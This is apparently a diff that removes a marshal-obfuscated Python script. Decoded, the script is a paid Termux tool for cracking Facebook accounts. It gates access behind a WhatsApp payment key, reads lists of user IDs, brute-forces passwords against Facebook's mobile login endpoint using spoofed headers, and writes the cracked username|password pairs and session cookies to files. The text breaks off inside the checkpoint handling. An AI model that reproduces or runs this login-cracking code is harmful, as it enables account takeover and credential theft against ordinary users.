@@ -1,2 +1,696 @@
-import marshal
-exec(marshal.loads(b's|I\x00\x00import os\r\n\r\ntry:\r\n\r\n    import requests\r\n\r\nexcept ImportError:\r\n\r\n    print(\'\\n [\xe2\x9c\x93] installing requests !...\\n\')\r\n\r\n    os.system(\'pip install requests\')\r\n\r\ntry:\r\n\r\n    import concurrent.futures\r\n\r\nexcept ImportError:\r\n\r\n    print(\'\\n [\xe2\x9c\x93] installing futures !...\\n\')\r\n\r\n    os.system(\'pip install futures\')\r\n\r\ntry:\r\n\r\n    import bs4\r\n\r\nexcept ImportError:\r\n\r\n    print(\'\\n [\xe2\x9c\x93] installing bs4 !...\\n\')\r\n\r\n    os.system(\'pip install bs4\')\r\n\r\nimport requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib\r\n\r\nfrom concurrent.futures import ThreadPoolExecutor as sarfrazssb\r\n\r\nfrom datetime import datetime\r\n\r\nfrom bs4 import BeautifulSoup\r\n\r\nct = datetime.now()\r\n\r\nn = ct.month\r\n\r\nbulan = [\'January\', \'February\', \'March\', \'April\', \'May\', \'June\', \'July\', \'Agustus\', \'September\', \'October\', \'November\', \'December\']\r\n\r\ntry:\r\n\r\n    if n < 0 or n > 12:\r\n\r\n        exit()\r\n\r\n    nTemp = n - 1\r\n\r\nexcept ValueError:\r\n\r\n    exit()\r\n\r\ncurrent = datetime.now()\r\n\r\nta = current.year\r\n\r\nbu = current.month\r\n\r\nha = current.day\r\n\r\nop = bulan[nTemp]\r\n\r\nP = \'\\x1b[1;97m\' # \r\n\r\nM = \'\\033[1;96m\' # \r\n\r\nH = \'\\033[1;94m\' # \r\n\r\nK = \'\\x1b[1;93m\' # \r\n\r\nB = \'\\x1b[1;97m\' # \r\n\r\nU = \'\\x1b[1;97m\' # \r\n\r\nO = \'\\x1b[1;97m\' # \r\n\r\nN = \'\\x1b[0m\'    # \r\n\r\nmy_color = [\r\n\r\n P, M, H, K, B, U, O, N]\r\n\r\nwarna = random.choice(my_color)\r\n\r\ndata,data2={},{}\r\n\r\naman,cp,salah=0,0,0\r\n\r\nubahP,fuck,pwBaru=[],[],[]\r\n\r\nok = []\r\n\r\ncp = []\r\n\r\nid = []\r\n\r\nuser = []\r\n\r\nloop = 0\r\n\r\nurl_lookup = "https://lookup-id.com/"\r\n\r\nurl_mb = "https://m.facebook.com"\r\n\r\nurl_ip = "https://www.httpbin.org/ip"\r\n\r\nheader_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}\r\n\r\nbulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}\r\n\r\ndone = False\r\n\r\ndef jalan(z):\r\n\r\n    for e in z + \'\\n\':\r\n\r\n        sys.stdout.write(e)\r\n\r\n        sys.stdout.flush()\r\n\r\n        time.sleep(0.01)\r\n\r\n        \r\n\r\ndef main_apv():\r\n\r\n    imt="110Y==MAHDI"\r\n\r\n    ak="MAHDI_100RS"\r\n\r\n    os.system(\'clear\')\r\n\r\n    print(logo)\r\n\r\n    try:\r\n\r\n        key1=open(\'/data/data/com.termux/files/usr/bin/.akkkk-cov\', \'r\').read()\r\n\r\n    except IOError:\r\n\r\n        os.system("clear")\r\n\r\n        print(logo)\r\n\r\n        print ("\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n        print ("YOUR TOKEN IS NOT APROVAL")     \r\n        print ("         THIS IS YOUR TOKEN\xf0\x9f\x91\x87\xf0\x9f\x93\xa5\xf0\x9f\x93\xac")\r\n        print ("\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n\r\n        print ("")\r\n\r\n        myid=uuid.uuid4().hex[:10].upper()\r\n\r\n        print ("          YOUR KEY : "+ak+myid+imt)\r\n\r\n        print ("\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n\r\n        kok=open(\'/data/data/com.termux/files/usr/bin/.akkkk-cov\', \'w\')\r\n\r\n        kok.write(myid+imt)\r\n\r\n        kok.close()\r\n\r\n        print ("")\r\n\r\n        print ("")\r\n\r\n        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")\r\n\r\n        print ("\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n\r\n        time.sleep(3.5)\r\n\r\n        tks = \'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20\'+ak+\'\'+myid+\'\'+imt\r\n\r\n        os.system(\'am start https://wa.me/+92188049915?text=\' + tks)\r\n\r\n        \r\n\r\n    r1=requests.get("https://raw.githubusercontent.com/Shuvo-BBHH/taxt/main/imt.txt").text\r\n\r\n    if key1 in r1:\r\n\r\n        R()\r\n\r\n    else:\r\n\r\n        os.system("clear")\r\n\r\n        print(logo)\r\n\r\n        print ("         \xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n        print ("             \\033[1;94mGIVE ME 100RS FOR APROVAL RIAZ")     \r\n           \r\n        print ("             \\033[1;32mYOUR KEY : "+ak+key1)     \r\n        print ("             Key And Sent Me WP Approvel Your Key ")\r\n        print ("         \xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84")\r\n\r\n        time.sleep(3.5)\r\n\r\n        tks = \'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium\xe2\x9c\x93\xe2\x9c\x93%20%20%20%20%20My%20%20Key%20%20:%20\'+ak+\'\'+key1\r\n\r\n        os.system(\'am start https://wa.me/+923188049915?text=\' + tks)\r\n\r\nlogo="""\r\n           \\033[1;91m ##     ##    ###    ##     ##    ###    ########  #### \r\n           \\033[1;92m ###   ###   ## ##   ##     ##   ## ##   ##     ##  ##\r\n           \\033[1;93m #### ####  ##   ##  ##     ##  ##   ##  ##     ##  ##  \r\n           \\033[1;91m ## ### ## ##     ## ######### ##     ## ##     ##  ##\r\n           \\033[1;92m ##     ## ######### ##     ## ######### ##     ##  ##\r\n           \\033[1;93m ##     ## ##     ## ##     ## ##     ## ##     ##  ##  \r\n           \\033[1;91m ##     ## ##     ## ##     ## ##     ## ########  ####\r\n             \\033[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3    \\033[1;95mAUTHOR   : MAHDI HASAN        \\033[1;93m\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3    \\033[1;94mGITHUB   : MAHDI HASAN        \\033[1;93m\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3    \\033[1;93mFACEBOOK : MAHDI HASAN        \\033[1;93m\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3    \\033[1;92mWHATSAPP : +8801616406924     \\033[1;93m\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3       \\033[1;91mTHIS TOOL IS PAID          \\033[1;93m\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3    \\033[1;94mGIVE ME 100RS FOR APRVAL      \\033[1;93m\xe2\x96\x87\xe2\x96\x87\r\n             \\033[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\r\n         \\033[1;92m\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84\r\n""" \r\ndef hasil(OK,cp):\r\n\r\n\tif not len(OK) != 0:\t    pass\r\n\r\n\tif len(cp) != 0:\r\n\r\n\t    print(\'\\n\\n  \\x1b[1;97m Total OK : \\x1b[1;97m %s  \\x1b[1;97m/sdcard/RIAZ-OK.txt\' % (H, P, str(len(ok))))\r\n\r\n\t    print(\'  \\x1b[1;97m Total CP :\\x1b[1;97m   %s \\x1b[1;97m/sdcard/RIAZ-CP.txt\' % (H, P, str(len(cp))))\r\n\r\n\t    input("\\x1b[1;97mPress enter to back Ahmad Menu ")\r\n\r\n\t    R()\r\n\r\n\t\t\r\n\r\ndef R():\r\n\r\n\t\t\tos.system("clear")\r\n\r\n\t\t\tprint(logo)\r\n\r\n\t\t\tprint (\'\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84\')\r\n\r\n\t\t\tprint("\\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3\\033[1;92m\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5  \\033[1;95mSTART FILE CRACKING  : BST METHOD")\r\n\r\n\t\t\tprint("\\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3\\033[1;94m\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5  \\033[1;94mPUBLICK AC CRACKING  : NO LOGIN\xf0\x9f\x98\x93")\r\n\r\n\t\t\tprint("\\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3\\033[1;95m\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5  \\033[1;93mUNLIMITED FILEMAKING : NO LOGIN\xf0\x9f\x98\x93")\r\n\r\n\t\t\tprint("\\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3\\033[1;96m\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5  \\033[1;92mRANDOM AC CRACKING   : NO LOGIN\xf0\x9f\x98\x93")\r\n\r\n\t\t\tprint("\\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3\\033[1;97m\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5  \\033[1;91mFOLLEW ME ON WATAAP  : NO LOGIN\xf0\x9f\x98\x93")\r\n\r\n\t\t\tprint ("\\033[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x9e\xa3\\033[1;97m\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\xe2\x9d\xa5\\033[1;94mAB DAFA HO JAO YAHASE  : \xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7-\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b")\r\n\t\t\tprint (\'\\033[1;92m\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84\')\r\n\t\t\tkey = input(" [*] Choose : ")\r\n\t\t\tprint (\'\xe0\xbc\x84\xf0\x9d\x91\x9f\xf0\x9d\x91\x96\xf0\x9d\x91\x8e\xf0\x9d\x91\xa7\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xf0\x9d\x91\x98\xe2\x84\x8e\xf0\x9d\x91\x8e\xf0\x9d\x91\x9b\xe1\xad\x84\')\r\n\r\n\t\t\tif key in [""]:\r\n\r\n\t\t\t\tprint (" [!] Please Select Correct Option")\r\n\r\n\t\t\t\texit()\r\n\r\n\t\t\telif key in ["1", "01"]:\r\n\r\n\t\t\t\t__xxx__().imtiaz(id)\r\n\r\n\t\t\telif key in ["2", "02"]:\r\n\r\n\t\t\t\t\r\n\r\n\t\t\t\tos.system(\'python dump.py\')\r\n\r\n\t\t\telif key in ["3", "03"]:\r\n\r\n\t\t\t\t\r\n\r\n\t\t\t\tdupcutter()\r\n\r\n\t\t\telif key in ["4", "04"]:\r\n\r\n\t\t\t\t\r\n\r\n\t\t\t\tos.system("am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDI%20Paid%20Tools.%20My%20Key:%20")\r\n\r\n\t\t\t\tR()\r\n\r\n\t\t\telif key in ["5", "05"]:\r\n\r\n\t\t\t\ttime.sleep(0.5)\r\n\r\n\t\t\t\tyt()\r\n\r\n\t\t\t\tR()\r\n\r\n\t\t\t\tlogin()\r\n\r\n\t\t\telif key in ["0", "00" , "6"]:\r\n\r\n\t\t\t\ttime.sleep(0.5)\r\n\r\n\t\t\t\texit("\\n [\xe2\x9c\x93] Thank You\\n")\r\n\r\nclass __xxx__:\r\n\r\n    def __init__(self):\r\n\r\n        self.id = []\r\n\r\n    def imtiaz(self,ak):\r\n\r\n        if 1 in fuck:\r\n\r\n            os.system(\'#\')\r\n\r\n        \r\n\r\n      \r\n\r\n        \r\n\r\n        self.cnt = input(\' [*] Put File Name : \')\r\n\r\n        self.id = open(self.cnt).read().splitlines()\r\n\r\n        os.system(\'clear\')\r\n\r\n        print(logo)\r\n\r\n        print("")\r\n\r\n        ___worldwide___ = (\'y\')\r\n\r\n        if ___worldwide___ in (\'yes\',\'Yes\',\'Y\', \'y\'):\r\n\r\n            self.__pler__()\r\n\r\n        else:\r\n\r\n            print(\' [!] Choose Correct One\');\r\n\r\n            self.sarfrazx(id)\r\n\r\n    def __metode__(self, user, __chi__, cebok):\r\n\r\n        global ok,cp,loop\r\n\r\n        sys.stdout.write(f"\\r \\x1b[1;33m[RIAZ]\\x1b[1;33m {loop}|{len(self.id)} \\x1b[1;32m[ok][{len(ok)}] ")\r\n\r\n        sys.stdout.flush()\r\n\r\n        try:\r\n\r\n            for pw in __chi__:\r\n\r\n                pw = pw.lower()\r\n\r\n                session=requests.Session()\r\n\r\n                header = {\r\n\r\n                    "Host":cebok,\r\n\r\n                    "upgrade-insecure-requests":"1",\r\n\r\n                    "user-agent":"NokiaC5-05/22.5.007 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba+",\r\n\r\n                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",\r\n\r\n                    "dnt":"1",\r\n\r\n                    "x-requested-with":"mark.via.gp",\r\n\r\n                    "sec-fetch-site":"same-origin",\r\n\r\n                    "sec-fetch-mode":"cors",\r\n\r\n                    "sec-fetch-user":"empty",\r\n\r\n                    "sec-fetch-dest":"document",\r\n\r\n                    "referer":"https://m.facebook.com/",\r\n\r\n                    "accept-encoding":"gzip, deflate br",\r\n\r\n                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"\r\n\r\n                }\r\n\r\n                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)\r\n\r\n                das = {\r\n\r\n                    "lsd":re.search(\'name="lsd" value="(.*?)"\', str(r.text)).group(1),\r\n\r\n                    "jazoest":re.search(\'name="jazoest" value="(.*?)"\', str(r.text)).group(1),\r\n\r\n                    "uid":user,\r\n\r\n                    "flow":"login_no_pin",\r\n\r\n                    "pass":pw,\r\n\r\n                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"\r\n\r\n                }\r\n\r\n                header1 = {\r\n\r\n                    "Host":cebok,\r\n\r\n                    "cache-control":"max-age=0",\r\n\r\n                    "upgrade-insecure-requests":"1",\r\n\r\n                    "origin":"https://"+cebok,\r\n\r\n                    "content-type":"application/x-www-form-urlencoded",\r\n\r\n                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",\r\n\r\n                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",\r\n\r\n                    "x-requested-with":"XMLHttpRequest",\r\n\r\n                    "sec-fetch-site":"same-origin",\r\n\r\n                    "sec-fetch-mode":"cors",\r\n\r\n                    "sec-fetch-user":"empty",\r\n\r\n                    "sec-fetch-dest":"document",\r\n\r\n                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",\r\n\r\n                    "accept-encoding":"gzip, deflate br",\r\n\r\n                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"\r\n\r\n                }\r\n\r\n                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)\r\n\r\n                if \'c_user\' in session.cookies.get_dict():\r\n\r\n                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])\r\n\r\n                    print(f"\\r{H} [RIAZ-ok \xf0\x9f\xa4\xab] {user} | {pw}")\r\n\r\n                    wrt = \'%s|%s\' % (user,pw)\r\n\r\n                    ok.append(wrt)\r\n\r\n                    open(\'/sdcard/RIAZ_OK.txt\' , \'a\').write(\'%s\\n\' % wrt)\r\n\r\n                    self.follow(session,coki)\r\n\r\n                    break\r\n\r\n                elif \'checkpoint\' in session.cookies.get_dict():\r\n\r\n                    try:\r\n\r\n                        tokenz = open(\'.token.txt\').read()\r\n\r\n                        cp_ttl = 